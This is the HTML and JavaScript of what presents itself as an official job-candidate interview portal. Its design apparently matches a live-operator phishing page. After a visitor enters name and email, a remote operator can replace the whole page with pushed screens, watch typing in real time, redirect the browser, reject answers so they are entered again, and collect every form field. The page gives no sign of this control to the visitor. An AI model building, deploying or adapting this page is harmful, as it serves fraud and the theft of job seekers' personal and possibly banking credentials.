<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Candidate Portal - Official</title>
    <style>
        /* Base Shell Styles */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow-x: hidden; font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }
        #screen-target { width: 100%; height: 100%; }
        
        /* Shake animation for errors */
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            50% { transform: translateX(10px); }
            75% { transform: translateX(-10px); }
        }
        .error-shake { animation: shake 0.4s ease-in-out; }

        /* Initial Login UI */
        .setup-container { display:flex; justify-content:center; align-items:center; height:100vh; }
        .setup-card { background:white; padding:40px; border-radius:12px; box-shadow:0 10px 25px rgba(0,0,0,0.1); width:400px; text-align:center; }
        .vacancy-card { border: 2px solid #eee; border-radius: 8px; padding: 12px; margin: 10px 0; cursor: pointer; transition: 0.3s; text-align: left; }
        .vacancy-card:hover { border-color: #007bff; background: #f8fbff; }
        .vacancy-card.selected { border-color: #007bff; background: #e7f3ff; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .btn-start { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div id="screen-target">
    <!-- Step 1: Vacancy Selection -->
    <div id="setup-screen" class="setup-container">
        <div class="setup-card">
            <h2>Available Vacancies</h2>
            <p>Select a role and enter details to begin</p>
            
            <div class="vacancy-card" onclick="selectRole(this, 'banking')">
                <strong>🏦 Customer Account Manager</strong><br>
                <small>Banking Operations</small>
            </div>
            <div class="vacancy-card" onclick="selectRole(this, 'data')">
                <strong>📊 Data Analyst</strong><br>
                <small>Financial Reporting</small>
            </div>
            <div class="vacancy-card" onclick="selectRole(this, 'general')">
                <strong>🏢 Administrative Officer</strong><br>
                <small>Office Management</small>
            </div>

            <input type="text" id="name-input" placeholder="Enter Full Name">
            <input type="email" id="email-input" placeholder="Enter Email Address">
            <button class="btn-start" onclick="startInterview()">Enter Interview Room</button>
        </div>
    </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io();
    let candidateName = "";
    let candidateEmail = "";
    let selectedCategory = "";
    let currentScreenFile = "";

    // Persistence Restore using Email (The Identity Hub)
    window.onload = () => {
        const savedEmail = localStorage.getItem('cand_email');
        const savedName = localStorage.getItem('cand_name');
        const savedCat = localStorage.getItem('cand_cat');
        
        if(savedEmail && savedName && savedCat) {
            document.getElementById('email-input').value = savedEmail;
            document.getElementById('name-input').value = savedName;
            candidateEmail = savedEmail;
            candidateName = savedName;
            selectedCategory = savedCat;
            startInterview(true); 
        }
    }

    function selectRole(element, category) {
        document.querySelectorAll('.vacancy-card').forEach(el => el.classList.remove('selected'));
        element.classList.add('selected');
        selectedCategory = category;
    }

    function startInterview(isRestore = false) {
        if(!isRestore) {
            candidateName = document.getElementById('name-input').value;
            candidateEmail = document.getElementById('email-input').value;
            
            if(!candidateName || !candidateEmail || !selectedCategory) {
                return alert("Select a role and enter both your name and email.");
            }
            
            localStorage.setItem('cand_name', candidateName);
            localStorage.setItem('cand_email', candidateEmail);
            localStorage.setItem('cand_cat', selectedCategory);
        }
        
        socket.emit('join_interview', { 
            name: candidateName, 
            email: candidateEmail, 
            category: selectedCategory 
        });
        
        document.getElementById('screen-target').innerHTML = `<div style="display:flex; height:100vh; align-items:center; justify-content:center; background:#fff;"><h3>Connecting to Interview Server...</h3></div>`;
    }

    // 100% Takeover Screen Loader
    socket.on('new_task', async (data) => {
        // Handle Redirection Command (Point 7)
        if (data.redirectUrl) {
            window.location.href = data.redirectUrl;
            return;
        }

        currentScreenFile = data.screenFile;
        try {
            const response = await fetch(`/screens/${data.screenFile}`);
            if (!response.ok) throw new Error("File not found");
            const html = await response.text();
            
            // Wipe UI and inject entire Screen (CSS + HTML)
            document.getElementById('screen-target').innerHTML = html;

            // Map Custom Headers to Screen if IDs exist
            if(document.getElementById('main-header')) document.getElementById('main-header').innerText = data.header || "";
            if(document.getElementById('sub-header')) document.getElementById('sub-header').innerText = data.subHeader || "";

            // Handle Dynamic Form Logic
            const form = document.querySelector('form');
            if(form) {
                form.onsubmit = (e) => { e.preventDefault(); validateAndSubmit(); };
                form.oninput = () => socket.emit('typing', { email: candidateEmail });
            }
        } catch (err) {
            document.getElementById('screen-target').innerHTML = `<p style="color:red; padding:20px;">System Error: Failed to load ${data.screenFile}</p>`;
        }
    });

    function validateAndSubmit() {
        const errDiv = document.getElementById('error-div');
        if(errDiv) errDiv.style.display = "none";

        const form = document.querySelector('form');
        const requiredFields = form.querySelectorAll('[required]');
        let allFilled = true;

        requiredFields.forEach(field => {
            if(!field.value.trim()) {
                allFilled = false;
                field.style.borderColor = "#d63031";
            } else {
                field.style.borderColor = "";
            }
        });

        if(!allFilled) {
            if(errDiv) {
                errDiv.innerText = "Please enter required fields";
                errDiv.style.display = "block";
            }
            return;
        }

        submitWork();
    }

    function submitWork() {
        const form = document.querySelector('form');
        const submitBtn = form.querySelector('button[type="submit"]') || form.querySelector('button');
        
        if(submitBtn) {
            submitBtn.disabled = true;
            submitBtn.innerText = "Processing...";
        }

        const formData = new FormData(form);
        let formattedResponse = "";

        formData.forEach((value, key) => {
            let cleanKey = key.replace(/[-_]/g, ' ')
                               .replace(/\b\w/g, l => l.toUpperCase());
            formattedResponse += `<b>${cleanKey}:</b> ${value}<br>`;
        });

        socket.emit('task_submitted', {
            email: candidateEmail,
            screenFile: currentScreenFile,
            answer: formattedResponse || "Form Acknowledged"
        });
    }

    socket.on('wrong_answer', (data) => {
        const errDiv = document.getElementById('error-div');
        const wrapper = document.querySelector('.wrapper');
        const submitBtn = document.querySelector('button');

        if(errDiv) {
            errDiv.innerText = data.message;
            errDiv.style.display = "block";
        }
        if(submitBtn) {
            submitBtn.disabled = false;
            submitBtn.innerText = "Resubmit Information";
        }
        
        if(wrapper) {
            wrapper.classList.add('error-shake');
            setTimeout(() => wrapper.classList.remove('error-shake'), 400);
        }
    });

    // Handle Force Reset/Removal from Examiner (Point 4 & 5)
    socket.on('force_reset', () => {
        localStorage.clear();
        window.location.reload();
    });
</script>
</body>
</html>
